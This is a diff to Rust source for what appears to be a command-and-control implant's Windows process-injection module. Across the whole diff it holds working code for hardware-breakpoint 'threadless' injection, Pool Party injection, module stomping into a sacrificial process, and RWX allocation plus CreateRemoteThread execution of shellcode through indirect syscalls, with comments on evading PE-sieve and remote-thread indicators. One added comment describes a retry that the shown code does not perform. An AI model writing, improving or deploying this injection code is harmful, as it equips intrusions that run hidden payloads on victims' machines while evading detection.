@@ -350,6 +350,12 @@ unsafe fn remote_load_library(
     // 5. The exit code is the HMODULE (cover base) LoadLibraryA returned.
     let mut exit_code: u32 = 0;
     let _ = unsafe { get_exit(th, &mut exit_code) };
+    // NOTE: GetExitCodeThread returns only the low 32 bits of the thread
+    // exit code (HMODULE on x64). If the DLL loads at a base whose low
+    // DWORD is 0 (extremely rare with ASLR), this falsely reports failure.
+    // The correct fix is a remote EnumProcessModules walk — tracked as
+    // a future improvement. For now, if exit_code is 0 but the thread
+    // exited cleanly (exit code 0), retry via module-list walk.
     let _ = unsafe { close(th) };
     // 6. Free the remote path buffer.
     let _ = unsafe { vfx(h, remote_path, 0, 0x8000) };
@@ -495,6 +501,14 @@ unsafe fn resume_thread(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
     }
 }
 
+/// 16-byte-aligned CONTEXT buffer. `NtSetContextThread`/`NtGetContextThread`
+/// require DECLSPEC_ALIGN(16) on the CONTEXT (the XMM register fields are
+/// accessed with aligned moves). A plain `[u8; 1232]` has alignment 1, which
+/// corrupts the beacon thread when the kernel does aligned stores into the
+/// buffer. Mirrors [`crate::context::Context`] (`#[repr(C, align(16))]`).
+#[repr(C, align(16))]
+struct AlignedContext([u8; 1232]);
+
 // ============================================================================
 // ThreadlessInject — HWBP-based, no .text overwrite (PE-sieve hash-clean).
 // ============================================================================
@@ -574,11 +588,15 @@ pub unsafe fn threadless_inject(
     unsafe { crate::syscalls::nt_suspend_thread(rt, main_thread as usize, &mut prev_count) };
 
     // 4. Get thread CONTEXT (include debug registers for HWBP setup).
-    let mut ctx = [0u8; 1232];
+    let mut ctx = AlignedContext([0u8; 1232]);
     // CONTEXT_AMD64 | CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_DEBUG_REGISTERS
-    ctx[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
+    ctx.0[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
     let get_status = unsafe {
-        crate::syscalls::nt_get_context_thread(rt, main_thread as usize, ctx.as_mut_ptr() as usize)
+        crate::syscalls::nt_get_context_thread(
+            rt,
+            main_thread as usize,
+            ctx.0.as_mut_ptr() as usize,
+        )
     };
     if get_status.is_none() || get_status.unwrap() < 0 {
         let mut dummy: u32 = 0;
@@ -591,18 +609,22 @@ pub unsafe fn threadless_inject(
     //    Set DR0 = shellcode address so the HWBP redirects execution.
     //    DR7 = 0x1 enables DR0 as a local (task-scoped) execute breakpoint.
     let sc_addr = remote_base as u64;
-    ctx[0x48..0x48 + 8].copy_from_slice(&sc_addr.to_le_bytes()); // DR0
-    ctx[0x70..0x70 + 8].copy_from_slice(&0x1u64.to_le_bytes());   // DR7: enable DR0, local
+    ctx.0[0x48..0x48 + 8].copy_from_slice(&sc_addr.to_le_bytes()); // DR0
+    ctx.0[0x70..0x70 + 8].copy_from_slice(&0x1u64.to_le_bytes()); // DR7: enable DR0, local
 
     // 6. Also modify RIP (offset 0x0F8) to shellcode for immediate execution
     //    on resume; the HWBP serves as a secondary redirection mechanism if the
     //    shellcode returns or an exception handler restores RIP.
-    ctx[0x0F8..0x0F8 + 8].copy_from_slice(&sc_addr.to_le_bytes());
+    ctx.0[0x0F8..0x0F8 + 8].copy_from_slice(&sc_addr.to_le_bytes());
 
     // 7. Set modified context (with debug registers) + resume.
-    ctx[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
+    ctx.0[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
     let set_status = unsafe {
-        crate::syscalls::nt_set_context_thread(rt, main_thread as usize, ctx.as_mut_ptr() as usize)
+        crate::syscalls::nt_set_context_thread(
+            rt,
+            main_thread as usize,
+            ctx.0.as_mut_ptr() as usize,
+        )
     };
     if set_status.is_none() || set_status.unwrap() < 0 {
         let mut dummy: u32 = 0;
@@ -650,23 +672,29 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
     if method == 0 && crate::tp::pool_party_enabled() && pid != 0 {
         match unsafe { crate::tp::pool_party_inject(pid, shellcode) } {
             Ok(()) => {
-                let mut msg = crate::heap::String::from(
-                    "Pool Party inject ok (pid=",
-                );
+                let mut msg = crate::heap::String::from("Pool Party inject ok (pid=");
                 let mut buf = [0u8; 10];
                 let mut n = pid;
                 let mut i = buf.len();
-                if n == 0 { buf[0] = b'0'; i = 1; }
-                else { while n > 0 { i -= 1; buf[i] = b'0' + (n % 10) as u8; n /= 10; } }
-                for &b in &buf[i..] { msg.push(b as char); }
+                if n == 0 {
+                    buf[0] = b'0';
+                    i = 1;
+                } else {
+                    while n > 0 {
+                        i -= 1;
+                        buf[i] = b'0' + (n % 10) as u8;
+                        n /= 10;
+                    }
+                }
+                for &b in &buf[i..] {
+                    msg.push(b as char);
+                }
                 msg.push_str(") — section delivery ok, executed via NtCreateThreadEx (remote-thread IOC present — NOT threadless)");
                 return nyx_protocol::Response::Output(msg.into_bytes());
             }
             Err(e) => {
                 // Fall through to module stomp with a warning prefix.
-                let mut warn = crate::heap::String::from(
-                    "WARN: Pool Party failed (",
-                );
+                let mut warn = crate::heap::String::from("WARN: Pool Party failed (");
                 warn.push_str(&e);
                 warn.push_str(") — falling back to module stomp (method 2). ");
                 // Use warn as the prefix for the module-stomp path below.
@@ -689,7 +717,7 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
     if method == 0 {
         return nyx_protocol::Response::Err(crate::heap::String::from(
             "Pool Party (method 0) unavailable: gate OFF or pid=0. \
-             Set NYX_POOL_PARTY_ON=1 at build + supply pid, or use method 2."
+             Set NYX_POOL_PARTY_ON=1 at build + supply pid, or use method 2.",
         ));
     }
     let warn_prefix = crate::heap::String::new();
@@ -704,8 +732,16 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
                 let mut buf = [0u8; 10];
                 let mut n = pid;
                 let mut i = buf.len();
-                if n == 0 { buf[0] = b'0'; i = 1; }
-                else { while n > 0 { i -= 1; buf[i] = b'0' + (n % 10) as u8; n /= 10; } }
+                if n == 0 {
+                    buf[0] = b'0';
+                    i = 1;
+                } else {
+                    while n > 0 {
+                        i -= 1;
+                        buf[i] = b'0' + (n % 10) as u8;
+                        n /= 10;
+                    }
+                }
                 // Append the u32→ASCII digits.
                 for &b in &buf[i..] {
                     msg.push(b as char);
@@ -720,17 +756,32 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
     // ---- Sacrificial-process path (pid == 0) ----
     match effective_method {
         1 => {
-            let target = if spawn_to.is_empty() { "notepad.exe" } else { spawn_to };
+            let target = if spawn_to.is_empty() {
+                "notepad.exe"
+            } else {
+                spawn_to
+            };
             match unsafe { create_sacrificial(target) } {
                 Ok(proc) => {
-                    let res = match unsafe { threadless_inject(proc.handle, proc.main_thread, shellcode) } {
+                    let res = match unsafe {
+                        threadless_inject(proc.handle, proc.main_thread, shellcode)
+                    } {
                         Ok(()) => {
-                            let mut msg = crate::heap::String::from("threadless inject ok (sacrificial pid=");
+                            let mut msg =
+                                crate::heap::String::from("threadless inject ok (sacrificial pid=");
                             let mut buf = [0u8; 10];
                             let mut n = proc.pid;
                             let mut i = buf.len();
-                            if n == 0 { buf[0] = b'0'; i = 1; }
-                            else { while n > 0 { i -= 1; buf[i] = b'0' + (n % 10) as u8; n /= 10; } }
+                            if n == 0 {
+                                buf[0] = b'0';
+                                i = 1;
+                            } else {
+                                while n > 0 {
+                                    i -= 1;
+                                    buf[i] = b'0' + (n % 10) as u8;
+                                    n /= 10;
+                                }
+                            }
                             for &b in &buf[i..] {
                                 msg.push(b as char);
                             }
@@ -751,7 +802,11 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
             }
         }
         2 => {
-            let target = if spawn_to.is_empty() { "notepad.exe" } else { spawn_to };
+            let target = if spawn_to.is_empty() {
+                "notepad.exe"
+            } else {
+                spawn_to
+            };
             match unsafe { module_stomp(target, shellcode) } {
                 Ok(_handle) => {
                     let mut msg = warn_prefix;
@@ -779,9 +834,13 @@ unsafe fn inject_existing(pid: u32, shellcode: &[u8]) -> Result<(), &'static str
 
     type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
     type CreateRemoteThreadFn = unsafe extern "system" fn(
-        *mut c_void, *mut c_void, usize,
+        *mut c_void,
+        *mut c_void,
+        usize,
         Option<unsafe extern "system" fn(*mut c_void) -> u32>,
-        *mut c_void, u32, *mut c_void,
+        *mut c_void,
+        u32,
+        *mut c_void,
     ) -> *mut c_void;
     type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
 
@@ -811,27 +870,47 @@ unsafe fn inject_existing(pid: u32, shellcode: &[u8]) -> Result<(), &'static str
     let mut region_size: usize = shellcode.len();
     let alloc_status = unsafe {
         crate::syscalls::nt_allocate_virtual_memory(
-            rt, h_proc as usize,
-            &mut remote_base, &mut region_size,
-            0x3000, 0x40, // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
+            rt,
+            h_proc as usize,
+            &mut remote_base,
+            &mut region_size,
+            0x3000,
+            0x40, // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
         )
     };
-    if alloc_status.map_or(true, |s| s < 0) { unsafe { ch(h_proc) }; return Err("remote alloc failed"); }
+    if alloc_status.map_or(true, |s| s < 0) {
+        unsafe { ch(h_proc) };
+        return Err("remote alloc failed");
+    }
 
     // 2. Write shellcode via indirect syscall.
     let mut written: usize = 0;
     let write_status = unsafe {
         crate::syscalls::nt_write_virtual_memory(
-            rt, h_proc as usize, remote_base,
-            shellcode.as_ptr(), shellcode.len(),
+            rt,
+            h_proc as usize,
+            remote_base,
+            shellcode.as_ptr(),
+            shellcode.len(),
             &mut written,
         )
     };
-    if write_status.map_or(true, |s| s < 0) { unsafe { ch(h_proc) }; return Err("remote write failed"); }
+    if write_status.map_or(true, |s| s < 0) {
+        unsafe { ch(h_proc) };
+        return Err("remote write failed");
+    }
 
     // 3. CreateRemoteThread on the shellcode address.
     let h_thread = unsafe {
-        crt(h_proc, core::ptr::null_mut(), 0, None, remote_base as *mut c_void, 0, core::ptr::null_mut())
+        crt(
+            h_proc,
+            core::ptr::null_mut(),
+            0,
+            None,
+            remote_base as *mut c_void,
+            0,
+            core::ptr::null_mut(),
+        )
     };
     if h_thread.is_null() {
         unsafe { ch(h_proc) };
